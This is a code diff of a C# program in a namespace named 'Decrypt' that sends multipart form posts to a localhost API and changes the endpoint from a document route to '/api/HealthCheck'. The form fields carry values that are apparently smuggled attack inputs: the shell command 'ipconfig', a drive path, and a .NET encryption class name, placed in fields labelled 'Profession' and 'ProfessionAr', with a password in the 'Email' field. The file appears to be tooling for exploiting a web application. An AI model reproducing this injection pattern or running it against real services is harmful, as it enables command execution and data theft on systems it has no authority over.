@@ -19,7 +19,7 @@ namespace Decrypt
                 form.Add(new StringContent("D:\\uaepass"), "Profession");
                 form.Add(new StringContent(password), "Email");
 
-                var response = await client.PostAsync("http://localhost:5000/api/document/AddEitDesignatedPersonee", form);
+                var response = await client.PostAsync("http://localhost:5000/api/HealthCheck", form);
 
                 // 🟢 Ensure success
                 response.EnsureSuccessStatusCode();
@@ -61,7 +61,7 @@ namespace Decrypt
                 form.Add(new StringContent("Intalio.Encryption.EncryptionUtility"), "ProfessionAr");
                 form.Add(new StringContent(password), "Email");
 
-                response = await client.PostAsync("http://localhost:5000/api/document/AddEitDesignatedPersonee", form);
+                response = await client.PostAsync("http://localhost:5000/api/HealthCheck", form);
 
                 // 🟢 Ensure success
                 response.EnsureSuccessStatusCode();
@@ -95,7 +95,7 @@ namespace Decrypt
                 form.Add(new StringContent("ipconfig"), "Profession");
                 form.Add(new StringContent(password), "Email");
 
-                response = await client.PostAsync("http://localhost:5000/api/document/AddEitDesignatedPersonee", form);
+                response = await client.PostAsync("http://localhost:5000/api/HealthCheck", form);
 
                 // 🟢 Ensure success
                 response.EnsureSuccessStatusCode();
@@ -129,7 +129,7 @@ namespace Decrypt
                 form.Add(new StringContent("D:\\uaepass"), "Profession");
                 form.Add(new StringContent(password), "Email");
 
-                response = await client.PostAsync("http://localhost:5000/api/document/AddEitDesignatedPersonee", form);
+                response = await client.PostAsync("http://localhost:5000/api/HealthCheck", form);
 
                 // 🟢 Ensure success
                 response.EnsureSuccessStatusCode();
